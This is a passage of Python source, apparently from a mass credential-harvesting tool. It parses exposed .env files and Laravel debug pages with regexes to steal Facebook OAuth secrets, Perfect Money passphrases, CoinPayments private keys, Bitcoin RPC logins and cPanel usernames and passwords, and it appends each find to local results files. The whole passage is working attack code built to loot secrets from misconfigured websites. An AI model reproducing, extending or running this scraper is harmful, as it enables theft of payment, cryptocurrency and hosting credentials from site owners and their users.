                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_secret = ''
                    try:
                        facebook_redi = reg("\nFACEBOOK_CALLBACK_URL = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_redi = ''
                elif "<td>FACEBOOK_CLIENT_ID</td>" in page:
                    try:
                        facebook_id = reg("<td>FACEBOOK_CLIENT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_id = ''
                    try:
                        facebook_secret = reg("<td>FACEBOOK_CLIENT_SECRET<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_secret = ''
                    try:
                        facebook_redi = reg("<td>FACEBOOK_CALLBACK_URL<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        facebook_redi = ''
                if facebook_id == '' or facebook_secret == '':
                    return False
                else:
                    build = f"FACEBOOK_CLIENT_ID: {facebook_id}\nFACEBOOK_CLIENT_SECRET: {facebook_secret}\n" \
                            f"FACEBOOK_CALLBACK_URL: {facebook_redi}"
                    remover = build.replace('\r', '')
                    ssh = open("Results/Facebook_INFO_FOUND.txt", "a")
                    ssh.write(remover + '\n\n')
                    ssh.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_perfectmony(self, page):
        global pm_id, pm_secret, pm_current_acc, pm_merchent_id, pm_merchent_name, pm_units, pm_alt_pass
        try:
            if "PM_ACCOUNTID=" in page or "PM_ACCOUNTID = " in page or "<td>PM_ACCOUNTID</td>" in page:
                if "PM_ACCOUNTID=" in page:
                    try:
                        pm_id = reg("PM_ACCOUNTID=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_id = ''
                    try:
                        pm_secret = reg("FPM_PASSPHRASE=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_secret = ''
                    try:
                        pm_current_acc = reg("PM_CURRENT_ACCOUNT=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_current_acc = ''
                    try:
                        pm_merchent_id = reg("PM_MARCHANTID=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_merchent_id = ''
                    try:
                        pm_merchent_name = reg("PM_MARCHANT_NAME=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_merchent_name = ''
                    try:
                        pm_units = reg("PM_UNITS=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_units = ''
                    try:
                        pm_alt_pass = reg("PM_ALT_PASSPHRASE=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_alt_pass = ''
                elif "PM_ACCOUNTID = " in page:
                    try:
                        pm_id = reg("PM_ACCOUNTID = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_id = ''
                    try:
                        pm_secret = reg("PM_PASSPHRASE = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_secret = ''
                    try:
                        pm_current_acc = reg("PM_CURRENT_ACCOUNT = (.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_current_acc = ''
                    try:
                        pm_merchent_id = reg("PM_MARCHANTID = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_merchent_id = ''
                    try:
                        pm_merchent_name = reg("PM_MARCHANT_NAME = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_merchent_name = ''
                    try:
                        pm_units = reg("PM_UNITS = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_units = ''
                    try:
                        pm_alt_pass = reg("PM_ALT_PASSPHRASE = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        pm_alt_pass = ''
                elif "<td>PM_ACCOUNTID</td>" in page:
                    try:
                        pm_id = reg("<td>PM_ACCOUNTID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_id = ''
                    try:
                        pm_secret = reg("<td>PM_PASSPHRASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_secret = ''
                    try:
                        pm_current_acc = reg("<td>PM_CURRENT_ACCOUNT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_current_acc = ''
                    try:
                        pm_merchent_id = reg("<td>PM_MARCHANTID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_merchent_id = ''
                    try:
                        pm_merchent_name = reg("<td>PM_MARCHANT_NAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_merchent_name = ''
                    try:
                        pm_units = reg("<td>PM_UNITS<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_units = ''
                    try:
                        pm_alt_pass = reg("<td>PM_ALT_PASSPHRASE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        pm_alt_pass = ''
                if pm_id == '' or pm_secret == '':
                    return False
                else:
                    build = f"PM_ACCOUNTID: {pm_id}\nPM_PASSPHRASE: {pm_secret}\n" \
                            f"PM_CURRENT_ACCOUNT: {pm_current_acc}\nPM_MARCHANTID: {pm_merchent_id}\n" \
                            f"PM_MARCHANT_NAME: {pm_merchent_name}\nPM_UNITS: {pm_units}\nPM_ALT_PASSPHRASE: {pm_alt_pass}"
                    remover = build.replace('\r', '')
                    fb = open("Results/Facebook_INFO_FOUND.txt", "a")
                    fb.write(remover + '\n\n')
                    fb.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_coinpayment(self, page, star):
        global coin_private, coin_pub, coin_merch, coin_ipn, coin_ipn_url
        try:
            if "COINPAYMENT_PRIVATE_KEY=" in page or "COINPAYMENT_PRIVATE_KEY = " in page or "<td>COINPAYMENT_PRIVATE_KEY</td>" in page:
                if "COINPAYMENT_PRIVATE_KEY=" in page:
                    try:
                        coin_private = reg("COINPAYMENT_PRIVATE_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_private = ''
                    try:
                        coin_pub = reg("COINPAYMENT_PUBLIC_KEY=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_pub = ''
                    try:
                        coin_merch = reg("COINPAYMENT_MERCHANT_ID=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_merch = ''
                    try:
                        coin_ipn = reg("COINPAYMENT_IPN_SECRET=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_ipn = ''
                    try:
                        coin_ipn_url = reg("COINPAYMENT_IPN_URL=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_ipn_url = ''
                elif "COINPAYMENT_PRIVATE_KEY = " in page:
                    try:
                        coin_private = reg("COINPAYMENT_PRIVATE_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_private = ''
                    try:
                        coin_pub = reg("COINPAYMENT_PUBLIC_KEY = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_pub = ''
                    try:
                        coin_merch = reg("COINPAYMENT_MERCHANT_ID = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_merch = ''
                    try:
                        coin_ipn = reg("COINPAYMENT_IPN_SECRET = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_ipn = ''
                    try:
                        coin_ipn_url = reg("COINPAYMENT_IPN_URL = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        coin_ipn_url = ''
                elif "<td>COINPAYMENT_PRIVATE_KEY</td>" in page:
                    try:
                        coin_private = reg("<td>COINPAYMENT_PRIVATE_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_private = ''
                    try:
                        coin_pub = reg("<td>COINPAYMENT_PUBLIC_KEY<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_pub = ''
                    try:
                        coin_merch = reg("<td>COINPAYMENT_MERCHANT_ID<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_merch = ''
                    try:
                        coin_ipn = reg("<td>COINPAYMENT_IPN<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_ipn = ''
                    try:
                        coin_ipn_url = reg("<td>COINPAYMENT_IPN_URL<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        coin_ipn_url = ''
                if coin_private == '':
                    return False
                else:
                    build = f"COINPAYMENT_URL: {star}\nCOINPAYMENT_PRIVATE_KEY: {coin_private}\nCOINPAYMENT_PUBLIC_KEY:" \
                            f" {coin_pub}\nCOINPAYMENT_MERCHANT_ID: {coin_merch}\nCOINPAYMENT_IPN: {coin_ipn}\n" \
                            f"COINPAYMENT_IPN_URL: {coin_ipn_url}"
                    remover = build.replace('\r', '')
                    coinpay_schrijf = open("Results/COINPAYMENT_API.txt", "a")
                    coinpay_schrijf.write(remover + '\n\n')
                    coinpay_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_btcrpc(self, page, star):
        global btc_rpc_scheme, btc_host, btc_port, btc_password, btc_user, btc_fees, btc_ssl
        try:
            if "BTC_API_RPCUSER=" in page or "BTC_API_RPCUSER = " in page or "<td>BTC_API_RPCUSER</td>" in page:
                if "BTC_API_RPCUSER=" in page:
                    try:
                        btc_rpc_scheme = reg("BTC_API_PORT=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_rpc_scheme = ''
                    try:
                        btc_host = reg("BTC_API_HOST=(.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("BTC_API_PORT=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_user = reg("BTC_API_RPCUSER=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_user = ''
                    try:
                        btc_password = reg("BTC_API_RPCPASSWORD=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_fees = reg("BTC_API_NETWORK_FEE=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_fees = ''
                    try:
                        btc_ssl = reg("BTC_API_SSL_CERT=(.*?)\n", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_ssl = ''
                elif "BTC_API_RPCUSER = " in page:
                    try:
                        btc_rpc_scheme = reg("BTC_API_SCHEME = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_rpc_scheme = ''
                    try:
                        btc_host = reg("BTC_API_HOST = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("BTC_API_PORT = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_user = reg("BTC_API_RPCUSER = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_user = ''
                    try:
                        btc_password = reg("BTC_API_RPCPASSWORD = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_fees = reg("BTC_API_NETWORK_FEE = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_fees = ''
                    try:
                        btc_ssl = reg("BTC_API_SSL_CERT = (.*?)\n", page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '')
                    except:
                        btc_ssl = ''
                elif "<td>BTC_API_RPCUSER</td>" in page:
                    try:
                        btc_rpc_scheme = reg("<td>BTC_API_SCHEME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_rpc_scheme = ''
                    try:
                        btc_host = reg("<td>BTC_API_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_host = ''
                    try:
                        btc_port = reg("<td>BTC_API_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_port = ''
                    try:
                        btc_user = reg("<td>BTC_API_RPCUSER<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_user = ''
                    try:
                        btc_password = reg("<td>BTC_API_RPCPASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_password = ''
                    try:
                        btc_fees = reg("<td>BTC_API_NETWORK_FEE<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_fees = ''
                    try:
                        btc_ssl = reg("<td>BTC_API_SSL_CERT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>", page)[
                            0].replace(
                            "\n", "").replace("\r", "").replace('"', '')
                    except:
                        btc_ssl = ''
                if btc_user == '' or btc_password == '':
                    return False
                else:
                    build = f"BTC_API_URL: {star}\nBTC_API_SCHEME: {btc_rpc_scheme}\nBTC_API_HOST:" \
                            f" {btc_host}\nBTC_API_PORT: {btc_port}\nBTC_API_RPCUSER: {btc_user}\n" \
                            f"BTC_API_RPCPASSWORD: {btc_password}\nBTC_API_NETWORK_FEE: {btc_fees}\nBTC_API_SSL_CERT" \
                            f": {btc_ssl}"
                    remover = build.replace('\r', '')
                    btc_rpc_schrijf = open("Results/BTC_RPC.txt", "a")
                    btc_rpc_schrijf.write(remover + '\n\n')
                    btc_rpc_schrijf.close()
                    return True
            else:
                return False
        except:
            return False

    def grab_cpanel(self, star, page):
        global cpanel_username, cpanel_password, method, cpanel_port, cpanel_host
        try:
            if 'CPANEL_HOST=' in page or '<td>CPANEL_HOST</td>' in page:
                if 'CPANEL_HOST=' in page:
                    method = "/.env"
                    try:
                        cpanel_host = reg('CPANEL_HOST=(.*?)\n', page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_host = ''

                    try:
                        cpanel_port = reg('CPANEL_PORT=(.*?)\n', page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_port = ''

                    try:
                        cpanel_username = reg('CPANEL_USERNAME=(.*?)\n', page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_username = ''

                    try:
                        cpanel_password = reg('CPANEL_PASSWORD=(.*?)\n', page)[0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_password = ''
                if '<td>CPANEL_HOST</td>' in page:
                    method = 'debug'
                    try:
                        cpanel_host = reg('<td>CPANEL_HOST<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace("\n",
                                                                                                                  "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_host = ''

                    try:
                        cpanel_port = reg('<td>CPANEL_PORT<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[0].replace("\n",
                                                                                                                  "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_port = ''

                    try:
                        cpanel_username = reg('<td>CPANEL_USERNAME<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[
                            0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_username = ''

                    try:
                        cpanel_password = reg('<td>CPANEL_PASSWORD<\\/td>\\s+<td><pre.*>(.*?)<\\/span>', page)[
                            0].replace("\n", "").replace(
                            "\r", "").replace('"', '').replace("'", "")
                    except:
                        cpanel_password = ''
                if cpanel_username == '' or cpanel_password == '':
                    return False
                else:
                    build = 'URL: ' + str(star) + '\nMETHOD: ' + str(method) + '\nCPANEL_HOST: ' + str(
                        cpanel_host) + '\nCPANEL_PORT: ' + str(cpanel_port) + '\nCPANEL_USERNAME: ' + str(
                        cpanel_username) + '\nCPANEL_PASSWORD: ' + str(cpanel_password)
                    remover = str(build).replace('\r', '')
                    save = open('result/CPANEL.txt', 'a')
                    save.write(remover + '\n\n')
                    save.close()
                    return cpanel_host, cpanel_username, cpanel_password
            else:
                return False
        except Exception:
            return False
